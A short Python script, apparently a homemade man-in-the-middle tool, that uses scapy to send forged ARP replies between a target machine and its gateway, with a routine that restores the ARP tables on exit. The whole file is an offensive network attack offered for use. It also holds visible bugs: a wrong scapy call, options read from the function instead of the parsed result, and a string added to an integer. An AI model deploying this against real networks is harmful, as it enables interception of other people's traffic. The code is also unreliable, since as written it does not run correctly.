# Man In The Middle
# echo 1> /proc/sys/net/ipv4/ip_forward subprocess yaz

#arp poison
import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):
    arp_request_packet=scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    broadcast_packet=scapy.Ether(dst="ff.ff.ff.ff.ff.ff")
    #scapy.ls(scapy.Ether())
    combined_packet=broadcast_packet/arp_request_packet
    answered_list=scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poisoning(target_ip,poisoned_ip):
    
    target_mac=get_mac_address(target_ip)

    arp_response=scapy.all(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_operation(target_ip,modem_ip):
    
    target_mac=get_mac_address(target_ip)
    modem_mac=get_mac_address(modem_ip)

    arp_response=scapy.all(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip,hwsrc=modem_mac)
    scapy.send(arp_response,verbose=False,count=6)
def get_user_input():
    parse_object=optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-m","--modem",dest="modem_ip",help="Enter Modem IP")
    options=parse_object.parse_args()[0]
    if not options.target_ip:
        print("Enter Target IP")
    if not options.modem_ip:
        print("Enter Modem IP")
    return options
number=0
user_ips=get_user_input()
user_target_ip=get_user_input.target_ip
user_modem_ip=get_user_input.modem_ip


try:
    while True:
        arp_poisoning(user_target_ip,user_modem_ip)
        arp_poisoning(user_modem_ip,user_target_ip)
        number+= 2
        print("\rSending pakets"+number,end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset_operation(user_target_ip,user_modem_ip)
    reset_operation(user_modem_ip ,user_target_ip)